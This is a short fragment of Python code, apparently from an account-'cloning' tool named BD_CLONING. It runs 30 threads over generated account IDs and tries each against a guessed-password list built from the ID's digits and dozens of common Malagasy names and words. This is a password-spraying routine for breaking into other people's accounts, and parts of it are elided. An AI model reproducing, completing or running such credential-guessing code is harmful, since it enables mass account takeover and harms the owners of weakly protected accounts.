...
def BD_CLONING():
    ...
    with tred(max_workers=30) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nomena','Nomena','fahendrena','Fahendrena','fandresena','Fandresena','malama','Malama','nantenaina','Nantenaina','rakoto','nilaina','Nilaina','nirina','Nirina','nathalie','narindra','Narindra','Nathalie','Rakoto','fitahiana','Fitahiana','diamondra','Diamondra','faniry','Faniry','havana','Havana','rakoto','hasina','Hasina','Rakoto','naivo','Naivo','christina','Christina','tsilavina','Tsilavina','valimbavaka','Valimbavaka','finaritra','Finaritra','milely','fiainana','Fiainana','mitomany','Mitomany','tezitra','fitiavana','Fitiavana','fanomezana','Fanomezana','tiavina','Tiavina','mahefa','Mahefa','Tsilavina','tsilavina','Sarindra','sarindra','nilaina','Nilaina','larissa','Larissa','Jirama','jirama','antsirabe','Antsirabe','Nomena','nambinina','Nambinina','sylvain','Sylvain','Sitraka','sitraka','nantenaina','mamitiana','Mamitiana','ravaka','Ravaka','nirina','Nirina','Christian','cristian','ronaldo','Ronaldo','ankoay','Ankoay','voromahery','Voromahery','manidina','Manidina','vololona','Vololona','mamasosy','Mamasosy','mamisoa','Mamisoa','sipako','fanomezantsoa','Fanomezantsoa','Sipako','fanantenana','Fanantenana','narindra','Narindra','Nathalie','fenosoa','Fenosoa','michel','Michel','mickael','Mickael','free fire','Lalatiana','lalatiana','mioty','Mioty','sarobidy','Sarobidy','Nantenaina','marinah','Marinah','lalaina','Lalaina', 'mendrika', 'mendrika', 'safidy','mahery','Mahery','diamondra','Diamondra','nirina','Nirina','jessica','Jessica','mandresy','Mandresy','fandresena','Fandresena','nasandratra','Nasandratra','niaina','Niaina']
